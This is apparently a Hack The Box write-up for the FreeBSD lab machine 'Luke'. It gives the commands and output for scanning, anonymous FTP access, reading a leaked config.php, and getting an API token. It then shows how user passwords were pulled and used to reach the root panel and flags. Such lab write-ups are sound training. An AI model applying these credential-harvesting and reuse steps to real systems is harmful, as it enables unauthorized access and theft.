# Luke 

Machine Level: Medium <br />
OS: FreeBSD

## Scanning 
I ran an aggressive NMAP scan to get a peak into the services on the machine. 
```
ajread@aj-ubuntu:~/hackthebox/htb_writeups$ nmap -A [TARGET IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-19 16:19 CST
Nmap scan report for [TARGET IP]
Host is up (0.079s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to [LOCAL IP]
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.75 seconds
```
## Enumeration 
I went after the FTP service and was able to log in anonymously. I found a txt file called ```for_Cihiro.txt```. 
```
ftp> get for_Chihiro.txt
local: for_Chihiro.txt remote: for_Chihiro.txt
229 Entering Extended Passive Mode (|||38665|)
150 Opening BINARY mode data connection for for_Chihiro.txt (306 bytes).
100% |**********************************************************************|   306        1.11 MiB/s    00:00 ETA
226 Transfer complete.
306 bytes received in 00:00 (4.10 KiB/s)
```
The file contained information from anothe user named Derry. 
```
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry  
```
I wanted to take a closer look at the service running on port 3000. 
```
ajread@aj-ubuntu:~/hackthebox/htb_writeups$ curl http://[TARGET IP]:3000/
{"success":false,"message":"Auth token is not supplied"}
```
I looks like I need to supply a token in order to access. I was able to find something on port 80 within a ```config.php``` file after running ```gobuster```. 
```
ajread@aj-ubuntu:~/hackthebox/htb_writeups$ curl http://[TARGET IP]/config.php
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword  = '[REDACTED]';
$db = "login";

$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```
I was able to send the credentials to port 3000 in the header and I was able to obtain a good token to use. 
```
ajread@aj-ubuntu:~/hackthebox/htb_writeups$ curl --header "Content-Type: application/json" --request POST --data '{"password":"[REDACTED]", "username":"admin"}' http://[TARGET IP]:3000/Login

{"success":true,"message":"Authentication successful!","token":"[REDACTED]"}
```
## Initial Access
I sent the token back to the server and logged in as a user to the database. 
```
ajread@aj-ubuntu:~/hackthebox/htb_writeups$ curl -X GET -H 'Authorization: Bearer [REDACTED]' http://[TARGET IP]:3000
{"message":"Welcome admin ! "}
```
I was able to grab the list of users from the database with the token as well. 
```
ajread@aj-ubuntu:~/hackthebox/htb_writeups$ curl -X GET -H 'Authorization: Bearer [REDACTED]' http://[TARGET IP]:3000/users
[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```
I saw the various users and I wanted to see if I could get their passwords as well. I know that Derry seems to be and admin or management user from the note in the FTP server. 
```
ajread@aj-ubuntu:~/hackthebox/htb_writeups$ curl -X GET -H 'Authorization: Bearer [REDACTED]' http://[TARGET IP]:3000/users/Derry
{"name":"Derry","password":"[REDACTED]"}
```
I was able to log into the http server running on port 80 at the ```/management``` subdirectory using Derry's credentials. I found a ```config.json``` file with what appeared to be the root user password. 
```
{
    "users": {
        "root": {
            "configs": {
                "ajenti.plugins.notepad.notepad.Notepad": "{\"bookmarks\": [], \"root\": \"/\"}", 
                "ajenti.plugins.terminal.main.Terminals": "{\"shell\": \"sh -c $SHELL || sh\"}", 
                "ajenti.plugins.elements.ipmap.ElementsIPMapper": "{\"users\": {}}", 
                "ajenti.plugins.munin.client.MuninClient": "{\"username\": \"username\", \"prefix\": \"http://localhost:8080/munin\", \"password\": \"123\"}", 
                "ajenti.plugins.dashboard.dash.Dash": "{\"widgets\": [{\"index\": 0, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.MemoryWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.SwapWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.dashboard.welcome.WelcomeWidget\"}, {\"index\": 0, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.uptime.UptimeWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.power.power.PowerWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.cpu.CPUWidget\"}]}", 
                "ajenti.plugins.elements.shaper.main.Shaper": "{\"rules\": []}", 
                "ajenti.plugins.ajenti_org.main.AjentiOrgReporter": "{\"key\": null}", 
                "ajenti.plugins.logs.main.Logs": "{\"root\": \"/var/log\"}", 
                "ajenti.plugins.mysql.api.MySQLDB": "{\"password\": \"\", \"user\": \"root\", \"hostname\": \"localhost\"}", 
                "ajenti.plugins.fm.fm.FileManager": "{\"root\": \"/\"}", 
                "ajenti.plugins.tasks.manager.TaskManager": "{\"task_definitions\": []}", 
                "ajenti.users.UserManager": "{\"sync-provider\": \"\"}", 
                "ajenti.usersync.adsync.ActiveDirectorySyncProvider": "{\"domain\": \"DOMAIN\", \"password\": \"\", \"user\": \"Administrator\", \"base\": \"cn=Users,dc=DOMAIN\", \"address\": \"localhost\"}", 
                "ajenti.plugins.elements.usermgr.ElementsUserManager": "{\"groups\": []}", 
                "ajenti.plugins.elements.projects.main.ElementsProjectManager": "{\"projects\": \"KGxwMQou\\n\"}"
            }, 
            "password": "[REDACTED]", 
            "permissions": []
        }
```
I logged into the service running on port 8000 and found the user and root flags within ```/home/derry/user.txt``` and ```/root/root.txt```. There was no need to elevate privileges to do so. 